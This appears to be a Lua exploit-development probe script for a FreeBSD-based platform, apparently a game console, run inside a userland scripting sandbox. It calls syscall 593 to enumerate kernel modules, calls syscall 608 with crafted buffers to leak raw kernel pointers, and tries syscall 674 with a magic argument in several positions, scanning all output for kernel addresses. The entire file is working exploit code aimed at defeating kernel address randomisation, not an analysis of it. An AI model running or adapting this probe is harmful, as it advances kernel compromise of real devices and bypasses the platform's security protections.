-- CRASH_CLASS: LOW
-- PROBE 1198b: sys 608 dynlib_get_info_ex — kernel qword dump (FIXED)
--
-- Context: upstream branch analysis shows 608 copies RAW kernel qwords to userland.
-- ABI: arg0 = module id, arg1 = flags, arg2 = pointer to buffer (first qword = 0x1a8).
-- Fields at +0x110, +0x128, +0x130, +0x148, +0x150 come from unmodified kernel entry.
-- Phase A: discover live module handles via 593
-- Phase B: call 608 on each live handle with flags 0-3, scan for kernel pointers
-- Phase C: test sys 674 with magic word 0x40000000
--
-- FIXES from 1198a:
--   1) Phase A: zero buffer before 593 (sentinel left garbage in high dword + struct fields)
--   2) Phase B: 0x1A8 marker was split wrong (0xA8+0x01 = 0x1_000000A8, not 0x1A8)
--   3) Name extraction: read individual bytes via dword + shift

print("=== PROBE 1198b: sys 608 dynlib_get_info_ex RECORDS (FIXED) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hex64(lo, hi)
    return string.format("%08X_%08X", (hi or 0) % 4294967296, (lo or 0) % 4294967296)
end

local function zero_fill(buf, n)
    for o = 0, n - 1, 4 do safe_wd(buf + o, 0) end
end

local function sentinel(buf, n)
    for o = 0, (n or 0x3FC) - 1, 4 do safe_wd(buf + o, 0xA5A5A5A5) end
end

local function read_byte(buf, off)
    local dw = safe_rd(buf + (off - off % 4))
    if not dw then return 0 end
    local shift = (off % 4) * 8
    return math.floor(dw / (2 ^ shift)) % 256
end

local function scan_kptrs(buf, n, label)
    local found = 0
    for o = 0, n - 8, 8 do
        local lo = safe_rd(buf + o)
        local hi = safe_rd(buf + o + 4)
        if lo and hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            print(string.format("  *** KPTR %s +0x%03X = %s ***", label, o, hex64(lo, hi)))
            found = found + 1
        end
    end
    return found
end

local function hex_dump(buf, n, label)
    for o = 0, n - 1, 16 do
        local vals = {}
        for k = 0, 12, 4 do
            if o + k < n then
                vals[#vals + 1] = string.format("%08X", safe_rd(buf + o + k) or 0)
            end
        end
        print(string.format("  %s +%03X  %s", label, o, table.concat(vals, " ")))
    end
end

local buf = to_num(memory.alloc(0x400))
local buf2 = to_num(memory.alloc(0x400))

-- ========== Phase A: discover live module handles via 593 ==========
print("--- PHASE A: discover live module handles (sys 593) ---")

local sc593 = make_syscall(593)
local live_handles = {}

for h = 0, 50 do
    zero_fill(buf, 0x200)
    safe_wd(buf, 0x160)
    local ok, rv = pcall(function()
        return sc593(uint64(h), uint64(buf))
    end)
    local r = ok and to_num(rv) or -999
    if r == 0 then
        local name_chars = {}
        for i = 0, 31 do
            local b = read_byte(buf, 0x08 + i)
            if b > 0 and b < 128 then
                name_chars[#name_chars + 1] = string.char(b)
            else
                break
            end
        end
        local name = table.concat(name_chars)
        if #name == 0 then name = "(unnamed)" end
        print(string.format("  [A] handle=%d name=%s", h, name))
        live_handles[#live_handles + 1] = h
    end
end

print(string.format("  [A] total live handles: %d", #live_handles))

-- ========== Phase B: sys 608 on each live handle ==========
print("")
print("--- PHASE B: sys 608 dynlib_get_info_ex records ---")

local sc608 = make_syscall(608)
local total_kptrs = 0

for _, h in ipairs(live_handles) do
    for fl = 0, 3 do
        zero_fill(buf, 0x1B0)

        -- first qword = 0x1A8 (struct size marker)
        safe_wd(buf, 0x1A8)      -- low dword = 0x1A8
        safe_wd(buf + 4, 0)       -- high dword = 0

        local ok, rv = pcall(function()
            return sc608(uint64(h), uint64(fl), uint64(buf), uint64(0), uint64(0))
        end)
        local r = ok and to_num(rv) or -999

        if r == 0 then
            local kn = scan_kptrs(buf, 0x1A8, string.format("h%d.f%d", h, fl))
            total_kptrs = total_kptrs + kn

            local critical = {0x110, 0x128, 0x130, 0x148, 0x150}
            local parts = {}
            for _, off in ipairs(critical) do
                local lo = safe_rd(buf + off)
                local hi = safe_rd(buf + off + 4)
                parts[#parts + 1] = string.format("+%03X=%s", off, hex64(lo, hi))
            end
            print(string.format("  [B] 608(h=%d f=%d) rv=0 CRITICAL: %s", h, fl, table.concat(parts, " ")))

            if h == live_handles[1] and fl == 0 then
                print("  [B] Full 0x1A8 dump for first module:")
                hex_dump(buf, 0x1A8, "mod0")
            end
        else
            if fl == 0 then
                print(string.format("  [B] 608(h=%d f=0) rv=%d", h, r))
            end
        end
    end
end

print(string.format("  [B] TOTAL KERNEL POINTERS FOUND: %d", total_kptrs))

-- ========== Phase C: sys 674 with magic word 0x40000000 ==========
print("")
print("--- PHASE C: sys 674 virtual_query_all with magic word ---")

local sc674 = make_syscall(674)
local out_count_buf = to_num(memory.alloc(16))
local record_buf = to_num(memory.alloc(0x4000))

-- uap layout for 674: (buf, count, out_count, ???, magic)
-- upstream says uap+0x20 = arg5 must be 0x40000000
-- arg5 is the 5th arg after the syscall number on FreeBSD amd64
-- try all positions since the ABI mapping is uncertain
local shapes = {
    {record_buf, 128, out_count_buf, 0, 0x40000000, "magic=arg5"},
    {record_buf, 128, out_count_buf, 0x40000000, 0, "magic=arg4"},
    {record_buf, 0x40000000, out_count_buf, 128, 0, "magic=arg2"},
    {0x40000000, record_buf, 128, out_count_buf, 0, "magic=arg1"},
}

for _, shape in ipairs(shapes) do
    sentinel(record_buf, 0x4000)
    safe_wd(out_count_buf, 0)
    safe_wd(out_count_buf + 4, 0)

    local ok, rv = pcall(function()
        return sc674(uint64(shape[1]), uint64(shape[2]), uint64(shape[3]),
                      uint64(shape[4]), uint64(shape[5]))
    end)
    local r = ok and to_num(rv) or -999
    local cnt_lo = safe_rd(out_count_buf)
    local cnt_hi = safe_rd(out_count_buf + 4)

    print(string.format("  [C] 674 %s rv=%d out_count=%s",
        shape[6], r, hex64(cnt_lo, cnt_hi)))

    if r == 0 and (cnt_lo or 0) > 0 then
        local count = cnt_lo
        if count > 10 then count = 10 end
        print(string.format("  [C] first %d of %d records:", count, cnt_lo))
        for i = 0, count - 1 do
            local base = record_buf + i * 0x48
            local start_lo = safe_rd(base)
            local start_hi = safe_rd(base + 4)
            local end_lo = safe_rd(base + 8)
            local end_hi = safe_rd(base + 12)
            local prot = safe_rd(base + 0x18)
            print(string.format("    rec[%d] start=%s end=%s prot=0x%X",
                i, hex64(start_lo, start_hi), hex64(end_lo, end_hi), prot or 0))
            local kn = scan_kptrs(base, 0x48, string.format("rec%d", i))
            total_kptrs = total_kptrs + kn
        end
    end
end

print("")
print(string.format("=== GRAND TOTAL KERNEL POINTERS: %d ===", total_kptrs))
print("[Z] alive")
print("=== DONE ===")
